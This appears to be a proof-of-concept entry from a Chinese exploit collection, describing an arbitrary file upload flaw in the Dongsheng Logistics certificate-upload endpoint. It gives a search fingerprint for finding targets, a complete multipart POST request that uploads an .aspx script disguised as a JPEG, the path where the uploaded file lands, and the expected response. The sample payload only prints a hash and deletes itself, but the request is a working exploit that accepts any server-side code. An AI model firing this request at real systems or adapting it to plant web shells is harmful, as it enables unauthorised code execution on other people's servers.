# 东胜物流certupload存在任意文件上传

- **系统**：东胜物流　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="theme/dhtmlxcombo.css"`
- **请求**：`POST /MsWlTruck/CertUpload HTTP/1.1`
- **关键头**：`Content-Length: 580`　`Content-Type: multipart/form-data; boundary=--------------------------dewl…`

**请求体 / payload**
```
----------------------------dewlibperhk4zgad5dyg
Content-Disposition: form-data; name="file"; filename="9sxujaitgy.aspx"
Content-Type: image/jpeg
<%@Page Language="C#"%>
<%
Response.Write(FormsAuthentication.HashPasswordForStoringInConfigFile("123456", "MD5"));
System.IO.File.Delete(Request.PhysicalPath);
%>
----------------------------dewlibperhk4zgad5dyg
Content-Disposition: form-data; name="TruckNo"
1
----------------------------dewlibperhk4zgad5dyg
Content-Disposition: form-data; name="Cert_Type"
1
----------------------------dewlibperhk4zgad5dyg--
**上传定位：**
GET /Areas/TruckMng/CertImages/…（脚本共 652 字，完整版见原文）
```
- **预期**：200　|　—